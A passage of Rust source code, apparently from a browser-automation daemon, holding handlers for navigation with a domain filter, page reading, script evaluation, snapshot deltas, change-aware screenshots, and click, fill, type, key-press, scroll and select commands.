    state.active_iframe_sessions.clear();
    state.active_frame_id = None;
    state
        .blocked_documents
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .clear();
    let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
    let result = mgr.navigate(url, wait_until).await?;
    state.refresh_active_iframe_sessions().await;

    // The domain filter answers a blocked document with a 403 page, so a
    // redirect to a disallowed host still completes as a navigation.
    // The main frame shares its ID with the target.
    let blocked = result
        .get("targetId")
        .and_then(|v| v.as_str())
        .and_then(|target_id| {
            state
                .blocked_documents
                .lock()
                .unwrap_or_else(|e| e.into_inner())
                .remove(target_id)
        });
    if let Some(blocked_url) = blocked {
        return Err(format!(
            "Navigation to {} was blocked by the domain filter",
            blocked_url
        ));
    }
    Ok(result)
}

async fn handle_url(state: &DaemonState) -> Result<Value, String> {
    if let Some(ref wb) = state.webdriver_backend {
        if state.browser.is_none() {
            let url = wb.get_url().await?;
            return Ok(json!({ "url": url }));
        }
    }
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let url = mgr.get_url().await?;
    Ok(json!({ "url": url }))
}

async fn handle_read(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mut options = crate::read::options_from_command(cmd)?;
    if let Some(allowed_domains) = {
        let df = state.domain_filter.read().await;
        df.as_ref().map(|filter| filter.allowed_domains.clone())
    } {
        if !allowed_domains.is_empty() {
            options.enforced_allowed_domains.push(allowed_domains);
        }
    }

    if let Some(url) = cmd.get("url").and_then(|v| v.as_str()) {
        return crate::read::run_read(url, options).await;
    }

    let url_data = handle_url(state).await?;
    let active_url = url_data
        .get("url")
        .and_then(|v| v.as_str())
        .filter(|url| !url.is_empty())
        .ok_or_else(|| "Active tab has no URL".to_string())?;
    crate::read::check_allowed_active_url_for_options(active_url, &options)?;

    if options.llms.is_some() || options.require_md {
        return crate::read::run_read(active_url, options).await;
    }

    let content_data = handle_content(state).await?;
    let html = content_data
        .get("html")
        .and_then(|v| v.as_str())
        .ok_or_else(|| "Active tab content is unavailable".to_string())?;
    let origin = content_data
        .get("origin")
        .and_then(|v| v.as_str())
        .filter(|origin| !origin.is_empty())
        .unwrap_or(active_url);
    Ok(crate::read::read_json_from_active_html(
        origin,
        html.to_string(),
        &options,
    ))
}

async fn handle_cdp_url(state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    if !mgr.is_connection_alive().await {
        return Err("Browser not launched".to_string());
    }
    Ok(json!({ "cdpUrl": mgr.get_cdp_url() }))
}

async fn handle_inspect(state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;

    // Shut down any existing inspect server so we always target the current page
    if let Some(server) = state.inspect_server.take() {
        server.shutdown();
    }

    let target_id = mgr.active_target_id()?.to_string();
    let chrome_hp = mgr.chrome_host_port().to_string();
    let proxy_handle = mgr.client.inspect_handle();

    let server = InspectServer::start(proxy_handle, target_id, chrome_hp).await?;
    let url = format!("http://127.0.0.1:{}", server.port());
    open_url_in_browser(&url);

    state.inspect_server = Some(server);
    Ok(json!({ "opened": true, "url": url }))
}

fn open_url_in_browser(url: &str) {
    #[cfg(target_os = "macos")]
    let result = std::process::Command::new("open").arg(url).spawn();
    #[cfg(target_os = "linux")]
    let result = std::process::Command::new("xdg-open").arg(url).spawn();
    #[cfg(target_os = "windows")]
    let result = std::process::Command::new("cmd")
        .args(["/c", "start", "", url])
        .spawn();
    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    let result: Result<std::process::Child, std::io::Error> = Err(std::io::Error::new(
        std::io::ErrorKind::Unsupported,
        "unsupported platform",
    ));
    if let Err(e) = result {
        let _ = writeln!(std::io::stderr(), "[inspect] Failed to open browser: {}", e);
    }
}

async fn handle_title(state: &DaemonState) -> Result<Value, String> {
    if let Some(ref wb) = state.webdriver_backend {
        if state.browser.is_none() {
            let title = wb.get_title().await?;
            return Ok(json!({ "title": title }));
        }
    }
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let title = mgr.get_title().await?;
    Ok(json!({ "title": title }))
}

async fn handle_content(state: &DaemonState) -> Result<Value, String> {
    if let Some(ref wb) = state.webdriver_backend {
        if state.browser.is_none() {
            let html = wb.get_content().await?;
            let url = wb.get_url().await.unwrap_or_default();
            return Ok(json!({ "html": html, "origin": url }));
        }
    }
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let html = mgr.get_content().await?;
    let url = mgr.get_url().await.unwrap_or_default();
    Ok(json!({ "html": html, "origin": url }))
}

async fn handle_evaluate(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    if let Some(ref wb) = state.webdriver_backend {
        if state.browser.is_none() {
            let script = cmd
                .get("script")
                .and_then(|v| v.as_str())
                .ok_or("Missing 'script' parameter")?;
            let result = wb.evaluate(script).await?;
            let url = wb.get_url().await.unwrap_or_default();
            return Ok(json!({ "result": result, "origin": url }));
        }
    }
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let script = cmd
        .get("script")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'script' parameter")?;

    let result = mgr.evaluate_remote_object(script).await?;
    let unserializable = result
        .unserializable_value
        .clone()
        .or_else(|| (result.object_type == "undefined").then(|| "undefined".to_string()));
    let url = mgr.get_url().await.unwrap_or_default();
    let mut data = json!({ "result": result.value.unwrap_or(Value::Null), "origin": url });
    if let Some(token) = unserializable {
        data["unserializable"] = json!(token);
    }
    Ok(data)
}

/// A user `close`: the session is over, so its stored security settings go.
async fn handle_close(state: &mut DaemonState) -> Result<Value, String> {
    close_session(state, true).await
}

/// Closes the browser and what hangs off it. The stored security settings are
/// forgotten only when `forget_settings` is set and the close succeeded: the
/// daemon restarts the CLI asks for (upgrade, changed options) keep them.
async fn close_session(state: &mut DaemonState, forget_settings: bool) -> Result<Value, String> {
    let save_result = auto_save_restore_state(state).await;
    close_all_browser_backends(state).await?;
    state.attached_target = None;

    // Stop background Fetch handler
    if let Some(task) = state.fetch_handler_task.take() {
        task.abort();
    }
    {
        let mut map = state.origin_headers.write().await;
        map.clear();
    }
    state.session_setup = SessionSetup::default();

    if let Some(server) = state.inspect_server.take() {
        server.shutdown();
    }

    state.ref_map.invalidate_all_documents();
    // An explicit close releases this session's pin before replying, so other
    // sessions need not wait for the daemon process to exit.
    let pin_release_error = match tab_binding::release_pin(&state.session_id) {
        Ok(Some(binding)) => {
            state.last_persisted_binding = Some(binding);
            None
        }
        Ok(None) => None,
        Err(e) => Some(e),
    };
    let settings_clear_error = if forget_settings {
        state.store.clear().err()
    } else {
        None
    };
    let unsaved = if state.flow.active() {
        state.har_recording = false;
        state.har_entries.clear();
        state.har_progress.clear();
        state.har_body_total_bytes = 0;
        state.flow.end_capture()
    } else {
        0
    };
    let mut reply = match save_result {
        Ok(Some(path)) => json!({
            "closed": true,
            "restoreStatus": state.restore_status,
            "saveStatus": state.restore_save_status,
            "statePath": path
        }),
        Ok(None) => json!({
            "closed": true,
            "restoreStatus": state.restore_status,
            "saveStatus": state.restore_save_status
        }),
        Err(err) => json!({
            "closed": true,
            "restoreStatus": state.restore_status,
            "saveStatus": state.restore_save_status,
            "saveError": err
        }),
    };
    if unsaved > 0 {
        reply["unsaved"] = json!({ "steps": unsaved });
    }
    if let Some(err) = pin_release_error {
        reply["pinReleaseError"] = json!(err);
    }
    if let Some(err) = settings_clear_error {
        reply["settingsClearError"] = json!(err.to_string());
    }
    Ok(reply)
}

// ---------------------------------------------------------------------------
// Phase 2 handlers
// ---------------------------------------------------------------------------

async fn handle_snapshot(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    let options = SnapshotOptions {
        selector: cmd
            .get("selector")
            .and_then(|v| v.as_str())
            .map(String::from),
        interactive: cmd
            .get("interactive")
            .and_then(|v| v.as_bool())
            .unwrap_or(false),
        compact: cmd
            .get("compact")
            .and_then(|v| v.as_bool())
            .unwrap_or(false),
        depth: cmd
            .get("maxDepth")
            .and_then(|v| v.as_u64())
            .map(|d| d as usize),
        urls: cmd.get("urls").and_then(|v| v.as_bool()).unwrap_or(false),
    };

    let previous_refs = state.ref_map.ref_ids();
    state.ref_map.begin_snapshot();
    let tree = snapshot::take_snapshot(
        &mgr.client,
        &session_id,
        &options,
        &mut state.ref_map,
        state.active_frame_id.as_deref(),
        &state.iframe_sessions,
    )
    .await?;

    let url = mgr.get_url().await.unwrap_or_default();

    let refs: serde_json::Map<String, Value> = state
        .ref_map
        .entries_sorted()
        .into_iter()
        .map(|(ref_id, entry)| {
            let mut obj = serde_json::Map::new();
            obj.insert("role".into(), Value::String(entry.role));
            obj.insert("name".into(), Value::String(entry.name));
            (ref_id, Value::Object(obj))
        })
        .collect();

    let current_refs = state.ref_map.ref_ids();
    let mut removed_refs = previous_refs
        .difference(&current_refs)
        .map(|ref_id| format!("@{}", ref_id))
        .collect::<Vec<_>>();
    removed_refs.sort_by_key(|ref_id| {
        ref_id
            .trim_start_matches("@e")
            .parse::<usize>()
            .unwrap_or(usize::MAX)
    });

    if !cmd.get("delta").and_then(Value::as_bool).unwrap_or(false) {
        return Ok(
            json!({ "snapshot": tree, "origin": url, "refs": refs, "removedRefs": removed_refs }),
        );
    }

    let options_key = serde_json::to_string(&json!({
        "selector": options.selector,
        "interactive": options.interactive,
        "compact": options.compact,
        "depth": options.depth,
        "urls": options.urls,
    }))
    .unwrap_or_default();
    let previous = state.snapshot_revisions.get(&session_id).cloned();
    let revision = previous.as_ref().map_or(1, |entry| entry.revision + 1);
    let force_full = cmd.get("full").and_then(Value::as_bool).unwrap_or(false)
        || previous
            .as_ref()
            .is_none_or(|entry| entry.url != url || entry.options != options_key);
    let response = if force_full {
        json!({
            "snapshot": { "kind": "full", "revision": revision, "tree": tree, "refs": refs },
            "origin": url,
        })
    } else {
        snapshot_delta_response(previous.as_ref().unwrap(), revision, &tree, &refs, &url)
    };

    if state.snapshot_revisions.len() >= 32 && !state.snapshot_revisions.contains_key(&session_id) {
        if let Some(oldest_key) = state
            .snapshot_revisions
            .iter()
            .min_by_key(|(_, entry)| entry.revision)
            .map(|(key, _)| key.clone())
        {
            state.snapshot_revisions.remove(&oldest_key);
        }
    }
    state.snapshot_revisions.insert(
        session_id,
        SnapshotRevision {
            revision,
            url,
            options: options_key,
            tree,
            refs,
        },
    );
    Ok(response)
}

fn snapshot_delta_response(
    previous: &SnapshotRevision,
    revision: u64,
    tree: &str,
    refs: &serde_json::Map<String, Value>,
    origin: &str,
) -> Value {
    if previous.tree == tree {
        return json!({
            "snapshot": { "kind": "unchanged", "baseRevision": previous.revision, "revision": revision },
            "origin": origin,
        });
    }

    let mut changes = Vec::new();
    for (ref_id, old_node) in &previous.refs {
        match refs.get(ref_id) {
            None => changes.push(json!({ "op": "remove", "ref": format!("@{}", ref_id) })),
            Some(new_node) => {
                for field in ["role", "name"] {
                    if old_node.get(field) != new_node.get(field) {
                        changes.push(json!({
                            "op": "replace",
                            "ref": format!("@{}", ref_id),
                            "field": field,
                            "value": new_node.get(field).cloned().unwrap_or(Value::Null),
                        }));
                    }
                }
            }
        }
    }
    for (ref_id, node) in refs {
        if !previous.refs.contains_key(ref_id) {
            changes.push(json!({ "op": "add", "ref": format!("@{}", ref_id), "node": node }));
        }
    }

    // Ref metadata contains only role/name, so it cannot describe checkbox
    // state, text, values, hierarchy, or ordering. Include an exact tree splice
    // alongside ref operations so every accepted revision can be reconstructed.
    let before_lines: Vec<&str> = previous.tree.split('\n').collect();
    let after_lines: Vec<&str> = tree.split('\n').collect();
    let prefix = before_lines
        .iter()
        .zip(&after_lines)
        .take_while(|(a, b)| a == b)
        .count();
    let suffix = before_lines[prefix..]
        .iter()
        .rev()
        .zip(after_lines[prefix..].iter().rev())
        .take_while(|(a, b)| a == b)
        .count();
    let tree_change = json!({
        "startLine": prefix,
        "deleteCount": before_lines.len() - prefix - suffix,
        "lines": after_lines[prefix..after_lines.len() - suffix],
    });
    let delta = json!({
        "kind": "delta",
        "baseRevision": previous.revision,
        "revision": revision,
        "changes": changes,
        "treeChange": tree_change,
    });
    let delta_size = serde_json::to_vec(&delta).map_or(usize::MAX, |bytes| bytes.len());
    if delta_size >= tree.len().saturating_mul(7) / 10 {
        json!({
            "snapshot": { "kind": "full", "revision": revision, "tree": tree, "refs": refs },
            "origin": origin,
        })
    } else {
        json!({ "snapshot": delta, "origin": origin })
    }
}

fn decode_screenshot_pixels(base64_data: &str) -> Result<(u32, u32, Vec<u8>, u64), String> {
    let encoded = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, base64_data)
        .map_err(|e| format!("Base64 decode error: {}", e))?;
    let image = image::load_from_memory(&encoded)
        .map_err(|e| format!("Failed to decode screenshot pixels: {}", e))?
        .to_rgba8();
    let (width, height) = image.dimensions();
    let rgba = image.into_raw();
    let mut hasher = DefaultHasher::new();
    width.hash(&mut hasher);
    height.hash(&mut hasher);
    rgba.hash(&mut hasher);
    Ok((width, height, rgba, hasher.finish()))
}

fn changed_pixel_ratio(
    previous: &ScreenshotObservation,
    width: u32,
    height: u32,
    rgba: &[u8],
) -> f64 {
    if previous.width != width || previous.height != height || previous.rgba.len() != rgba.len() {
        return 1.0;
    }
    if rgba.is_empty() {
        return 0.0;
    }
    let changed = previous
        .rgba
        .as_chunks::<4>()
        .0
        .iter()
        .zip(rgba.as_chunks::<4>().0)
        .filter(|(before, after)| before != after)
        .count();
    changed as f64 / (rgba.len() / 4) as f64
}

/// Compares decoded pixels with the last returned conditional screenshot.
/// Suppressed captures retain that baseline so small changes can accumulate.
/// Encoded image metadata therefore cannot create a false positive.
fn observe_screenshot(
    state: &mut DaemonState,
    key: String,
    signature: String,
    base64_data: &str,
    threshold: f64,
    options: &ScreenshotOptions,
) -> Result<Value, String> {
    let (width, height, rgba, decoded_hash) = decode_screenshot_pixels(base64_data)?;
    // Retain an independent baseline and revision when alternating capture
    // scopes in one tab. The shared cap also bounds retained pixel buffers.
    let key = (key, signature.clone());
    // Evict stale tab history before admitting another capture scope so decoded
    // image buffers remain bounded even during long multi-tab sessions.
    if !state.screenshot_observations.contains_key(&key)
        && state.screenshot_observations.len() >= 32
    {
        if let Some(eviction_key) = state.screenshot_observations.keys().next().cloned() {
            state.screenshot_observations.remove(&eviction_key);
        }
    }
    let previous = state.screenshot_observations.get(&key);
    let revision = previous.map_or(1, |item| item.revision.saturating_add(1));
    let pixel_change_ratio = match previous {
        Some(item) if item.signature == signature && item.decoded_hash == decoded_hash => 0.0,
        Some(item) if item.signature == signature => {
            changed_pixel_ratio(item, width, height, &rgba)
        }
        _ => 1.0,
    };
    let changed = previous.is_none()
        || previous.is_some_and(|item| item.signature != signature)
        || pixel_change_ratio > threshold;

    let path = if changed {
        Some(screenshot::save_screenshot(base64_data, options)?)
    } else {
        None
    };
    if changed {
        state.screenshot_observations.insert(
            key,
            ScreenshotObservation {
                revision,
                signature,
                decoded_hash,
                width,
                height,
                rgba,
            },
        );
    } else if let Some(previous) = state.screenshot_observations.get_mut(&key) {
        previous.revision = revision;
    }
    let mut response = json!({
        "changed": changed,
        "revision": revision,
        "pixelChangeRatio": pixel_change_ratio,
        "threshold": threshold
    });
    if let Some(path) = path {
        response["path"] = json!(path);
    }
    Ok(response)
}

async fn handle_screenshot(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let annotate = cmd
        .get("annotate")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let if_changed = cmd
        .get("ifChanged")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let threshold = cmd.get("threshold").and_then(|v| v.as_f64()).unwrap_or(0.0);
    let signature = format!(
        "selector={:?};fullPage={};annotate={}",
        cmd.get("selector").and_then(|v| v.as_str()),
        cmd.get("fullPage")
            .and_then(|v| v.as_bool())
            .unwrap_or(false),
        annotate
    );

    let format = cmd
        .get("format")
        .or_else(|| cmd.get("type"))
        .and_then(|v| v.as_str())
        .unwrap_or("png")
        .to_string();

    let mut options = ScreenshotOptions {
        selector: cmd
            .get("selector")
            .and_then(|v| v.as_str())
            .map(String::from),
        path: cmd.get("path").and_then(|v| v.as_str()).map(String::from),
        full_page: cmd
            .get("fullPage")
            .and_then(|v| v.as_bool())
            .unwrap_or(false),
        format,
        quality: cmd
            .get("quality")
            .and_then(|v| v.as_i64())
            .map(|q| q as i32),
        annotate,
        output_dir: cmd
            .get("screenshotDir")
            .and_then(|v| v.as_str())
            .map(String::from),
    };

    let (session_id, result) = if let Some(wb) = state
        .webdriver_backend
        .as_ref()
        .filter(|_| state.browser.is_none())
    {
        if annotate {
            return Err(
                "Annotated screenshots are not yet implemented on the WebDriver backend"
                    .to_string(),
            );
        }
        options.path.get_or_insert_with(|| {
            format!(
                "/tmp/screenshot-{}.png",
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_millis())
                    .unwrap_or(0)
            )
        });
        (
            "webdriver-active".to_string(),
            screenshot::ScreenshotResult {
                base64: wb.screenshot().await?,
                annotations: Vec::new(),
            },
        )
    } else {
        let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
        let session_id = mgr.active_session_id()?.to_string();
        if annotate {
            state.ref_map.begin_snapshot();
            let _ = snapshot::take_snapshot(
                &mgr.client,
                &session_id,
                &SnapshotOptions {
                    interactive: true,
                    ..SnapshotOptions::default()
                },
                &mut state.ref_map,
                state.active_frame_id.as_deref(),
                &state.iframe_sessions,
            )
            .await?;
        }

        let result = screenshot::take_screenshot(
            &mgr.client,
            &session_id,
            &state.ref_map,
            &options,
            &state.iframe_sessions,
        )
        .await?;

        (session_id, result)
    };

    let mut response = if if_changed {
        observe_screenshot(
            state,
            session_id,
            signature,
            &result.base64,
            threshold,
            &options,
        )?
    } else {
        json!({ "path": screenshot::save_screenshot(&result.base64, &options)? })
    };
    if !result.annotations.is_empty() {
        response["annotations"] = serde_json::to_value(&result.annotations)
            .map_err(|e| format!("Failed to serialize annotations: {}", e))?;
    }

    Ok(response)
}

fn record_click_animation(
    result: &interaction::ClickResult,
    mouse: &mut MouseState,
    history: &recording::SharedRecordingCursor,
) {
    mouse.x = result.x;
    mouse.y = result.y;
    mouse.buttons = i32::from(result.pending_release.is_some());
    if let Ok(mut cursor) = history.lock() {
        cursor.record(result.x, result.y, 0);
        if result.button_pressed {
            cursor.record(result.x, result.y, 1);
            if result.pending_release.is_none() {
                cursor.record(result.x, result.y, 0);
            }
        }
    }
}

async fn handle_click(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    if let Some(ref wb) = state.webdriver_backend {
        if state.browser.is_none() {
            wb.click(selector).await?;
            return Ok(json!({ "clicked": selector }));
        }
    }

    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    let new_tab = cmd.get("newTab").and_then(|v| v.as_bool()).unwrap_or(false);

    if new_tab {
        use super::element::resolve_element_object_id;
        let (object_id, effective_session_id) = resolve_element_object_id(
            &mgr.client,
            &session_id,
            &state.ref_map,
            selector,
            &state.iframe_sessions,
        )
        .await?;
        let call_params = json!({
            "objectId": object_id,
            "functionDeclaration": "function() { var h = this.getAttribute('href'); if (!h) return null; try { return new URL(h, document.baseURI).toString(); } catch(e) { return null; } }",
            "returnByValue": true
        });
        let call_result = mgr
            .client
            .send_command(
                "Runtime.callFunctionOn",
                Some(call_params),
                Some(&effective_session_id),
            )
            .await?;
        let href = call_result
            .get("result")
            .and_then(|r| r.get("value"))
            .and_then(|v| v.as_str())
            .ok_or_else(|| {
                format!(
                    "Element '{}' does not have an href attribute. --new-tab only works on links.",
                    selector
                )
            })?
            .to_string();

        let domain_filter = state.domain_filter.read().await.clone();
        let has_proxy_creds = state.proxy_credentials.read().await.is_some();
        let defer_url_until_controls = should_defer_url_until_network_controls(
            domain_filter.as_ref(),
            has_proxy_creds,
            Some(&href),
        )?;
        // `click --new-tab` creates the same kind of daemon-owned tab as
        // `tab new`, so it must use the same pre-navigation setup path.
        let defer_url = defer_url_until_controls || session_setup_pending(state).await;

        state.ref_map.begin_snapshot();
        state.active_iframe_sessions.clear();
        state.active_frame_id = None;
        state.webmcp.clear_invocations();
        let new_session_id = {
            let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
            mgr.tab_new(if defer_url { None } else { Some(&href) }, None)
                .await?;
            mgr.active_session_id()?.to_string()
        };

        apply_session_setup(state, &new_session_id).await?;
        install_network_controls_or_close(state, has_proxy_creds).await?;
        state.drain_cdp_events_background().await?;

        if defer_url {
            let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
            mgr.navigate(&href, WaitUntil::Load).await?;
        }

        state.refresh_active_iframe_sessions().await;

        return Ok(json!({ "clicked": selector, "newTab": true, "url": href }));
    }

    let button = cmd.get("button").and_then(|v| v.as_str()).unwrap_or("left");
    let click_count = cmd.get("clickCount").and_then(|v| v.as_i64()).unwrap_or(1) as i32;

    let input_mode = cmd
        .get("inputMode")
        .and_then(Value::as_str)
        .unwrap_or(&state.input_mode);
    if input_mode != "instant" {
        let (x, y, target_session_id) = super::element::resolve_element_center(
            &mgr.client,
            &session_id,
            &state.ref_map,
            selector,
            &state.iframe_sessions,
            true,
        )
        .await?;
        let offset = super::element::session_viewport_offset(
            &mgr.client,
            &session_id,
            &target_session_id,
            &state.iframe_sessions,
        )
        .await?;
        move_mouse_interpolated(
            &mgr.client,
            &target_session_id,
            &mut state.mouse_state,
            x,
            y,
            if input_mode == "smooth" { 200 } else { 0 },
            None,
            input_mode == "human",
            cmd.get("seed").and_then(Value::as_u64).unwrap_or(0),
            0,
            offset,
            &state.recording_state.shared_cursor,
        )
        .await?;
    }

    let result = interaction::click(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        button,
        click_count,
        &state.iframe_sessions,
    )
    .await?;
    record_click_animation(
        &result,
        &mut state.mouse_state,
        &state.recording_state.shared_cursor,
    );
    if let Some(ref server) = state.stream_server {
        server.broadcast_pointer("click", result.x, result.y);
    }

    if result.dialog_opened {
        state.pending_pointer_release = result.pending_release;
        return Ok(json!({ "clicked": selector, "dialogOpened": true }));
    }
    Ok(json!({ "clicked": selector }))
}

async fn handle_dblclick(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let result = interaction::dblclick(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    record_click_animation(
        &result,
        &mut state.mouse_state,
        &state.recording_state.shared_cursor,
    );
    if result.dialog_opened {
        state.pending_pointer_release = result.pending_release;
        return Ok(json!({ "clicked": selector, "dialogOpened": true }));
    }
    Ok(json!({ "clicked": selector }))
}

async fn handle_fill(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;
    let value = cmd
        .get("value")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'value' parameter")?;

    if let Some(ref wb) = state.webdriver_backend {
        if state.browser.is_none() {
            wb.fill(selector, value).await?;
            return Ok(json!({ "filled": selector }));
        }
    }

    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    interaction::fill(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        value,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "filled": selector }))
}

async fn handle_type(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;
    let text = cmd
        .get("text")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'text' parameter")?;
    let clear = cmd.get("clear").and_then(|v| v.as_bool()).unwrap_or(false);
    let delay = cmd.get("delay").and_then(|v| v.as_u64());

    interaction::type_text(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        text,
        clear,
        delay,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "typed": text }))
}

async fn handle_press(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let key = cmd
        .get("key")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'key' parameter")?;

    // Parse modifier+key chords like "Control+a", "Shift+Enter", "Control+Shift+a"
    let (actual_key, modifiers) = parse_key_chord(key);

    interaction::press_key_with_modifiers(&mgr.client, &session_id, &actual_key, modifiers).await?;
    Ok(json!({ "pressed": key }))
}

/// Parse a key chord string like "Control+a" or "Control+Shift+Enter" into
/// the actual key name and an optional CDP modifier bitmask.
///
/// CDP modifier values: 1 = Alt, 2 = Control, 4 = Meta (Cmd), 8 = Shift.
fn parse_key_chord(input: &str) -> (String, Option<i32>) {
    let parts: Vec<&str> = input.split('+').collect();
    if parts.len() < 2 {
        return (input.to_string(), None);
    }

    let mut modifiers = 0i32;
    let mut key_parts: Vec<&str> = Vec::new();

    for part in &parts {
        match part.to_lowercase().as_str() {
            "alt" => modifiers |= 1,
            "control" | "ctrl" => modifiers |= 2,
            "meta" | "cmd" | "command" => modifiers |= 4,
            "shift" => modifiers |= 8,
            _ => key_parts.push(part),
        }
    }

    // If no modifiers were found, the '+' was part of the key name (e.g. "+")
    // or the input was something unexpected — treat the whole string as the key.
    if modifiers == 0 {
        return (input.to_string(), None);
    }

    // The actual key is whatever remains after stripping modifiers.
    // If nothing remains (e.g. "Control+"), treat the whole string as-is.
    let actual_key = if key_parts.is_empty() {
        input.to_string()
    } else {
        key_parts.join("+")
    };

    (actual_key, Some(modifiers))
}

async fn handle_hover(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let position = interaction::hover(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    (state.mouse_state.x, state.mouse_state.y) = position;
    if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
        cursor.record(position.0, position.1, state.mouse_state.buttons);
    }
    Ok(json!({ "hovered": selector }))
}

async fn handle_scroll(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd.get("selector").and_then(|v| v.as_str());

    let (mut dx, mut dy) = (
        cmd.get("x").and_then(|v| v.as_f64()).unwrap_or(0.0),
        cmd.get("y").and_then(|v| v.as_f64()).unwrap_or(0.0),
    );

    if let Some(direction) = cmd.get("direction").and_then(|v| v.as_str()) {
        let amount = cmd.get("amount").and_then(|v| v.as_f64()).unwrap_or(300.0);
        match direction {
            "up" => dy = -amount,
            "down" => dy = amount,
            "left" => dx = -amount,
            "right" => dx = amount,
            _ => {}
        }
    }

    interaction::scroll(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        dx,
        dy,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "scrolled": true }))
}

async fn handle_select(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let values: Vec<String> = match cmd.get("values") {
        Some(Value::Array(arr)) => arr
            .iter()
            .filter_map(|v| v.as_str().map(String::from))
            .collect(),
        Some(Value::String(s)) => vec![s.clone()],
        _ => cmd
            .get("value")
            .and_then(|v| v.as_str())
            .map(|s| vec![s.to_string()])
            .unwrap_or_default(),
    };

    interaction::select_option(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &values,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "selected": values }))
}

async fn handle_check(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    if let Some(position) = interaction::check(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?
    {
        (state.mouse_state.x, state.mouse_state.y) = position;
        if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
            cursor.record(position.0, position.1, state.mouse_state.buttons);
        }
    }
    Ok(json!({ "checked": selector }))
}

async fn handle_uncheck(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    if let Some(position) = interaction::uncheck(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?
    {
        (state.mouse_state.x, state.mouse_state.y) = position;
        if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
            cursor.record(position.0, position.1, state.mouse_state.buttons);
        }
    }
